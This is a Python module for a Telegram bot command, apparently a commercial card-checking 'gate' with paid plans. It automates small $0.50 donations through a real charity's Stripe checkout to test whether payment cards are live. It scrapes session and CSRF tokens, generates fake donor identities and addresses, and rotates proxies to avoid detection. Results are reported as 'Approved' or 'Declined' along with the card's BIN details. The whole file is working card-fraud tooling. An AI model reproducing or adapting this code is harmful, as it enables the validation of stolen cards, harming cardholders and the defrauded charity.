import aiohttp
import asyncio
import time
import re
import json
import random
import string
import uuid
from html import escape
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CommandHandler, ContextTypes
from config import get_bin_info, kb_result, OWNER_ID, FORCE_CHANNELS, SUPPORT_LINK, API_TIMEOUT

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🦇 ONAMISIONKC STRIPE API CONFIGURATION 🦇
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
BASE_URL = "https://www.onamissionkc.org"
FUND_ID = "6acfdbc6-2deb-42a5-bdf2-390f9ac5bc7b"
WEBSITE_ID = "62fc11be71fa7a1da8ed62f8"
STRIPE_PK = "pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e"
STRIPE_ACCOUNT = "acct_1LwocDFHMGxIu0Ep"
DONATION_AMOUNT_CENTS = 50  # $0.50
GATE_NAME = "Sᴛʀɪᴘᴇ 0$ 💳 🟢"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOCAL DATA & PROXY HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
FIRST_NAMES = ["James", "John", "Robert", "Michael", "David", "William", "Richard", "Joseph", "Thomas", "Charles", "Mary", "Patricia", "Jennifer", "Linda", "Barbara", "Elizabeth", "Susan", "Jessica", "Sarah", "Karen", "Daniel", "Matthew", "Anthony", "Mark", "Steven", "Andrew", "Joshua", "Kevin", "Brian", "Edward", "Christopher", "Ryan", "Nicholas", "Eric", "Jonathan", "Stephen", "Larry", "Justin", "Scott", "Brandon"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson", "Walker", "Young", "Allen", "King", "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores"]
EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com", "aol.com", "icloud.com"]
US_CITIES = [("Fort Lauderdale", "FL", "33316"), ("Miami", "FL", "33101"), ("Orlando", "FL", "32801"), ("Tampa", "FL", "33601"), ("Jacksonville", "FL", "32099"), ("Houston", "TX", "77001"), ("Dallas", "TX", "75201"), ("Austin", "TX", "73301"), ("San Antonio", "TX", "78201"), ("Los Angeles", "CA", "90001"), ("San Diego", "CA", "92101"), ("San Francisco", "CA", "94102"), ("New York", "NY", "10001"), ("Chicago", "IL", "60601"), ("Phoenix", "AZ", "85001")]
US_STREETS = ["1900 Southeast 15th Street", "1234 Main Street", "5678 Oak Avenue", "9012 Palm Boulevard", "3456 Maple Drive", "7890 Cedar Lane", "2345 Elm Street", "6789 Pine Road", "0123 Birch Court", "4567 Willow Way"]

def load_proxies():
    try:
        with open("px.txt", "r") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except FileNotFoundError:
        return []

PROXIES = load_proxies()

def get_user_data(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> dict:
    uid = str(user_id)
    if "user_data" not in context.bot_data: context.bot_data["user_data"] = {}
    if uid not in context.bot_data["user_data"]:
        context.bot_data["user_data"][uid] = {
            "name": "User", "credits": 150, "plan": "TRIAL", "expires": 0, "pre_premium_credits": 0
        }
    return context.bot_data["user_data"][uid]

def is_user_premium(ud: dict) -> bool:
    raw_plan = ud.get("plan", "TRIAL").upper()
    if raw_plan == "TRIAL": return False
    if ud.get("expires", 0) <= time.time():
        ud["plan"] = "TRIAL"; ud["credits"] = ud.get("pre_premium_credits", 150); ud["expires"] = 0
        return False
    return True

def get_styled_plan(raw_plan: str) -> str:
    plan_upper = raw_plan.upper()
    if plan_upper == "CORE": return "✨ Cᴏʀᴇ ✨"
    elif plan_upper == "ELITE": return "⭐ Eʟɪᴛᴇ ⭐"
    elif plan_upper == "ROOT": return "👑 Rᴏᴏᴛ 👑"
    else: return "Tʀɪᴀʟ"

async def _check_force_sub(user_id: int, context) -> list:
    if user_id == OWNER_ID: return []
    not_joined = []
    for name, link in FORCE_CHANNELS:
        try:
            member = await context.bot.get_chat_member(f"@{name}", user_id)
            if member.status in ("left", "kicked"): not_joined.append((name, link))
        except Exception:
            pass
    return not_joined

def get_desktop_headers(origin=None, referer=None, sec_site="none", sec_mode="navigate", sec_dest="document"):
    h = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 'cache-control': 'no-cache', 'pragma': 'no-cache', 'priority': 'u=0, i',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"19.0.0"', 'sec-fetch-dest': sec_dest, 'sec-fetch-mode': sec_mode,
        'sec-fetch-site': sec_site, 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
    }
    if origin: h['origin'] = origin
    if referer: h['referer'] = referer
    return h

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AUTOMATED API REQUEST FUNCTIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def step0_get_crumb(session, proxy):
    headers = get_desktop_headers()
    async with session.get(f"{BASE_URL}/", headers=headers, proxy=proxy, timeout=20) as resp:
        pass # Cookies are automatically stored in the aiohttp session's cookie_jar
    
    cookies = session.cookie_jar.filter_cookies(BASE_URL)
    crumb = cookies.get("crumb")
    return crumb.value if crumb else None

async def step1_get_cart_token(session, proxy):
    headers = get_desktop_headers(origin=BASE_URL, referer=f'{BASE_URL}/donate-now', sec_site='same-origin', sec_mode='cors', sec_dest='empty')
    headers['accept'] = 'application/json, text/plain, */*'
    headers['content-type'] = 'application/json'
    del headers['upgrade-insecure-requests']; del headers['sec-fetch-user']

    payload = {'amount': {'value': DONATION_AMOUNT_CENTS, 'currencyCode': 'USD'}, 'donationFrequency': 'ONE_TIME', 'feeAmount': None}
    
    async with session.post(f"{BASE_URL}/api/v1/fund-service/websites/{WEBSITE_ID}/donations/funds/{FUND_ID}", headers=headers, json=payload, proxy=proxy, timeout=20) as resp:
        data = await resp.json(content_type=None)
        
    redirect = data.get("redirectUrlPath", "")
    match = re.search(r'cartToken=([^&]+)', redirect)
    return match.group(1) if match else None

async def step1b_get_xsrf_and_total(session, cart_token, proxy):
    headers = get_desktop_headers(referer=f'{BASE_URL}/donate-now', sec_site='same-origin', sec_mode='navigate', sec_dest='document')
    async with session.get(f"{BASE_URL}/checkout?cartToken={cart_token}", headers=headers, proxy=proxy, timeout=20) as resp:
        html = await resp.text()

    xsrf = None
    match = re.search(r'"xsrfToken"\s*:\s*"([^"]+)"', html)
    if match: xsrf = match.group(1)
        
    grand_total = None
    match = re.search(r'"grandTotal"\s*:\s*{[^}]*"decimalValue"\s*:\s*"([^"]+)"', html)
    if match: grand_total = match.group(1)

    return xsrf, grand_total

async def step2_create_pm(session, card_data, full_name, email, address_info, proxy):
    headers = {
        'accept': 'application/json', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'pragma': 'no-cache',
        'priority': 'u=1, i', 'referer': 'https://js.stripe.com/', 'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
    }

    cn = card_data["card_number"]
    cn_fmt = ' '.join([cn[i:i+4] for i in range(0, len(cn), 4)])
    street, city, state, zip_code = address_info

    guid = str(uuid.uuid4()).replace('-', '') + '10e650'
    muid = str(uuid.uuid4())
    sid = str(uuid.uuid4())
    csid = str(uuid.uuid4())
    esid = f"elements_session_{''.join(random.choices(string.ascii_letters + string.digits, k=12))}"
    ecid = str(uuid.uuid4())

    data = {
        'billing_details[address][city]': city, 'billing_details[address][country]': 'US',
        'billing_details[address][line1]': street, 'billing_details[address][line2]': '',
        'billing_details[address][postal_code]': zip_code, 'billing_details[address][state]': state,
        'billing_details[name]': full_name, 'billing_details[email]': email, 'type': 'card',
        'card[number]': cn_fmt, 'card[cvc]': card_data['cvv'], 'card[exp_year]': card_data['year'], 'card[exp_month]': card_data['month'],
        'allow_redisplay': 'unspecified', 'payment_user_agent': 'stripe.js/39914d4bef; stripe-js-v3/39914d4bef; payment-element; deferred-intent',
        'referrer': BASE_URL, 'time_on_page': str(random.randint(200000, 500000)),
        'client_attribution_metadata[client_session_id]': csid, 'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element', 'client_attribution_metadata[merchant_integration_version]': '2021',
        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred', 'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
        'client_attribution_metadata[elements_session_id]': esid, 'client_attribution_metadata[elements_session_config_id]': ecid,
        'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment', 'guid': guid, 'muid': muid, 'sid': sid,
        'key': STRIPE_PK, '_stripe_account': STRIPE_ACCOUNT,
    }

    async with session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, proxy=proxy, timeout=20) as resp:
        rj = await resp.json(content_type=None)

    if "error" in rj:
        err = rj["error"]
        code = err.get("code", "unknown")
        msg = err.get("message", "Unknown error")
        dc = err.get("decline_code", "")

        emap = {
            "card_declined": (f"DECLINED | [{' ' + dc.upper() if dc else ''}] {msg}".strip()),
            "incorrect_number": "ERROR | INVALID_CARD_NUMBER", "invalid_expiry_year": "ERROR | INVALID_EXPIRY_YEAR",
            "invalid_expiry_month": "ERROR | INVALID_EXPIRY_MONTH", "invalid_cvc": "ERROR | INVALID_CVV",
            "expired_card": "DECLINED | EXPIRED_CARD", "incorrect_cvc": "ERROR | INVALID_CVV",
            "processing_error": "ERROR | PROCESSING_ERROR", "incorrect_zip": "DECLINED | ZIP_MISMATCH",
        }

        if code in emap: return None, emap[code]
        if "declin" in msg.lower(): return None, f"DECLINED | {msg.upper()}"
        return None, f"ERROR | {code.upper()}: {msg}"

    pm_id = rj.get("id")
    brand = rj.get("card", {}).get("brand", "visa").upper()
    return {"id": pm_id, "brand": brand}, None

async def step3_submit(session, cart_token, pm, full_name, email, crumb, xsrf, address_info, grand_total, proxy):
    headers = {
        'accept': 'application/json, text/plain, */*', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 'cache-control': 'no-cache',
        'content-type': 'application/json', 'origin': BASE_URL, 'pragma': 'no-cache', 'referer': f'{BASE_URL}/checkout?cartToken={cart_token}',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"19.0.0"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
        'x-csrf-token': crumb, 'x-siteuser-xsrf-token': xsrf,
    }

    fn = full_name.split()[0] if ' ' in full_name else full_name
    ln = ' '.join(full_name.split()[1:]) if ' ' in full_name else ''
    street, city, state, zip_code = address_info
    phone = f"{random.randint(200, 999)}{random.randint(200, 999)}{random.randint(1000, 9999)}"

    payload = {
        'email': email, 'subscribeToList': False, 'shippingAddress': {'id': '', 'firstName': '', 'lastName': '', 'line1': '', 'line2': '', 'city': city, 'region': state, 'postalCode': '', 'country': '', 'phoneNumber': ''},
        'createNewUser': False, 'newUserPassword': None, 'saveShippingAddress': False, 'makeDefaultShippingAddress': False, 'customFormData': None, 'shippingAddressId': None,
        'proposedAmountDue': {'decimalValue': grand_total, 'currencyCode': 'USD'}, 'cartToken': cart_token,
        'paymentToken': {'stripePaymentTokenType': 'PAYMENT_METHOD_ID', 'token': pm['id'], 'type': 'STRIPE'},
        'reCaptchaToken': None, 'billToShippingAddress': False,
        'billingAddress': {'id': '', 'firstName': fn, 'lastName': ln, 'line1': street, 'line2': '', 'city': city, 'region': state, 'postalCode': zip_code, 'country': 'US', 'phoneNumber': phone},
        'savePaymentInfo': False, 'makeDefaultPayment': False, 'paymentCardId': None, 'universalPaymentElementEnabled': True,
    }

    async with session.post(f"{BASE_URL}/api/2/commerce/orders", headers=headers, json=payload, proxy=proxy, timeout=30) as resp:
        try: rj = await resp.json(content_type=None)
        except: return "ERROR", "Invalid JSON response from API"

    raw = json.dumps(rj)
    ss = rj.get("submissionStatus", "").upper()

    if ss == "ORDER_CONFIRMED":
        status = "CHARGED"
    else:
        ft = rj.get("failureType", "")
        if ft: status = f"DECLINED | {ft}"
        elif "declined" in raw.lower() or "card_declined" in raw.lower(): status = "DECLINED"
        else: status = ss if ss else "UNKNOWN"

    return status, raw

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# /chk COMMAND HANDLER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # ── Maintenance check ──
    if context.bot_data.get("maintenance") and user.id != OWNER_ID:
        await update.message.reply_text("⚠️ Bot is under maintenance. Try again later.")
        return

    # ── Gate toggle check ──
    if not context.bot_data.get("chk_on", True):
        await update.message.reply_text("⚠️ Sᴛʀɪᴘᴇ gate is currently <b>OFF</b>.", parse_mode="HTML")
        return

    # ── Force subscribe check ──
    not_joined = await _check_force_sub(user.id, context)
    if not_joined:
        rows = [[InlineKeyboardButton(f"➺ Join @{n}", url=l)] for n, l in not_joined]
        rows.append([InlineKeyboardButton("✅ I Joined — Verify Now", callback_data="check_sub")])
        await update.message.reply_text(
            "<b>[ 𖥷iТ ] ➺ Jᴏɪɴ Rᴇǫᴜɪʀᴇᴅ</b>\n━━━━━━━━━━━━━━━━━\n"
            "Join our channel & group to use this bot.\n━━━━━━━━━━━━━━━━━",
            reply_markup=InlineKeyboardMarkup(rows), parse_mode="HTML"
        )
        return

    # ── Parse card (FIXED EXTRACTION) ──
    card_str = None
    if context.args:
        card_str = context.args[0].strip()
    elif update.message.reply_to_message:
        replied_msg = update.message.reply_to_message
        replied_text = replied_msg.text or replied_msg.caption or ""
        
        # Use Regex to find the actual card number inside the text (ignores the "[ 𖥷iТ ]" part)
        match = re.search(r'(\d{13,19})\s*[|,;\s]\s*(\d{1,2})\s*[|,;\s]\s*(\d{2,4})\s*[|,;\s]\s*(\d{3,4})', replied_text)
        if match:
            card_str = f"{match.group(1)}|{match.group(2)}|{match.group(3)}|{match.group(4)}"
        else:
            # Fallback: look for just a 13-19 digit number if there's no expiry/cvv
            match = re.search(r'\b(\d{13,19})\b', replied_text)
            if match:
                card_str = match.group(1)

    if not card_str:
        await update.message.reply_text(
            "⚠️ <b>Uꜱᴀɢᴇ:</b>\n"
            "<code>/chk cc|mm|yy|cvv</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/chk 4111111111111111|12|26|123</code>",
            parse_mode="HTML"
        )
        return

    # Validate card format
    parts = card_str.split("|")
    if len(parts) != 4:
        await update.message.reply_text("❌ Invalid format. Use: cc|mm|yy|cvv")
        return
    cc_num, mm, yy, cvv = parts
    if len(yy) == 4: yy = yy[-2:]
    card_data = {"card_number": cc_num, "month": mm.zfill(2), "year": yy, "cvv": cvv}

    # ── Credit check & deduction ──
    ud = get_user_data(user.id, context)
    premium = is_user_premium(ud)

    if not premium:
        if ud.get("credits", 0) <= 0:
            await update.message.reply_text(
                "<b>[ 𖥷iТ ] ➺ Nᴏ Cʀᴇᴅɪᴛꜱ ❌</b>\n━━━━━━━━━━━━━━━━━\n"
                "You have no credits left.\n"
                "Redeem a code with /rm or buy a plan.\n━━━━━━━━━━━━━━━━━",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("💎 BUY PREMIUM", callback_data="mprice")],
                    [InlineKeyboardButton("📞 Support", url=SUPPORT_LINK)],
                ])
            )
            return
        ud["credits"] -= 1

    msg = await update.message.reply_text("⏳ <b>[ 𖥷iТ ] ➺ Pʀᴏᴄᴇꜱꜱɪɴɢ...</b>", parse_mode="HTML")
    start_time = time.time()
    bin_num = card_str[:6]

    try:
        timeout = aiohttp.ClientTimeout(total=60)
        proxy = random.choice(PROXIES) if PROXIES else None
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            # 1. Get Crumb
            crumb = await step0_get_crumb(session, proxy)
            if not crumb: raise Exception("Failed to get crumb token")

            # 2. Get Cart Token
            cart_token = await step1_get_cart_token(session, proxy)
            if not cart_token: raise Exception("Failed to create cart token")

            # 3. Get XSRF & Grand Total
            xsrf, grand_total = await step1b_get_xsrf_and_total(session, cart_token, proxy)
            if not xsrf or not grand_total: raise Exception("Failed to parse checkout page")

            # 4. Generate Fake Data
            fn, ln = random.choice(FIRST_NAMES), random.choice(LAST_NAMES)
            full_name = f"{fn} {ln}"
            email = f"{fn.lower()}{ln.lower()}{random.randint(1, 99999)}@{random.choice(EMAIL_DOMAINS)}"
            address_info = random.choice(US_STREETS), *random.choice(US_CITIES)

            # 5. Tokenize Stripe PM
            pm, err = await step2_create_pm(session, card_data, full_name, email, address_info, proxy)
            if err:
                status_ui = "Dᴇᴄʟɪɴᴇᴅ ❌"
                raw_response = err
            else:
                # 6. Submit Order
                status, raw_response = await step3_submit(session, cart_token, pm, full_name, email, crumb, xsrf, address_info, grand_total, proxy)
                status_ui = "Aᴘᴘʀᴏᴠᴇᴅ ✅" if status == "CHARGED" else "Dᴇᴄʟɪɴᴇᴅ ❌"

        # Fetch BIN Info concurrently
        bin_data = await get_bin_info(bin_num)
        bin_txt = "N/A"
        if not bin_data.get("error"):
            s = str(bin_data.get("scheme", "N/A")).upper()
            b = bin_data.get("bank", "N/A")
            country = str(bin_data.get("country", "N/A")).upper()
            flag = bin_data.get("country_emoji", "")
            bin_txt = f"{s} - {b} - {flag} {country}"
            
        # Get User's Current Plan dynamically
        raw_plan = ud.get('plan', 'TRIAL').upper()
        plan_ui = get_styled_plan(raw_plan)
        username = user.first_name or "User"
        elapsed = f"{time.time() - start_time:.2f}"

        # Escape raw_response to prevent HTML crashes
        safe_response = escape(str(raw_response))
        
        # Exact Requested Premium UI Design
        text = (
            f"<b>[ 𖥷iТ ] ➺ {status_ui}</b>\n"
            f"🔍 ➺ <code>{card_str}</code>\n"
            f"Gᴀᴛᴇ ➺ {GATE_NAME}\n"
            f"Rᴀᴡ ➺ {safe_response}\n"
            f"Iɴꜰᴏ ➺ {bin_txt}\n"
            f"Uꜱᴇʀ ➺ {username} ({plan_ui})\n"
            f"Tɪᴍᴇ ➺ {elapsed}s\n"
            f"Pʀᴏ ➺ Batman⚡\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"📢 @Batcardchk"
        )
        
        await msg.edit_text(
            text, 
            parse_mode="HTML", 
            reply_markup=kb_result(premium), 
            disable_web_page_preview=True
        )
        
    except aiohttp.ClientTimeout: 
        if not premium: ud["credits"] = ud.get("credits", 0) + 1
        await msg.edit_text("<b>[ 𖥷iТ ] ➺ Tɪᴍᴇᴏᴜᴛ ❌</b>\n━━━━━━━━━━━━━━━━━\nAPI took too long. Try again.\n━━━━━━━━━━━━━━━━━", parse_mode="HTML")
    except Exception as e: 
        if not premium: ud["credits"] = ud.get("credits", 0) + 1
        await msg.edit_text(f"<b>[ 𖥷iТ ] ➺ Eʀʀᴏʀ ❌</b>\n━━━━━━━━━━━━━━━━━\n<code>{escape(str(e)[:120])}</code>\n━━━━━━━━━━━━━━━━━", parse_mode="HTML")

def get_chk_handler():
    return CommandHandler("chk", cmd_chk)
